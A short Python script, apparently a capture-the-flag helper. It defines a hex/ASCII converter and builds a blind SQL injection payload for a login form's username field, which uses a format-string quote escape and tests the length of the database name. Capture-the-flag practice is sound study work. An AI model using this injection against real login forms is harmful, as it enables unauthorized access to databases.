#coding:utf-8
class Converter():
    @staticmethod
    def to_ascii(h):
        list_s = []
        for i in range(0,len(h),2):
            list_s.append(chr(int(h[i:i+2].upper(),16)))
        return ''.join(list_s)
    @staticmethod
    def to_hex(s):
        list_h = []
        for c in s:
            list_h.append(str(hex(ord(c)))[-2:]) #取hex转换16进制的后两位
        return ''.join(list_h)

print(Converter.to_hex("flag"))
payload = "admin%1$\\' or " + "length(database())>1#"
data={'username':payload,'password':1}
print (data)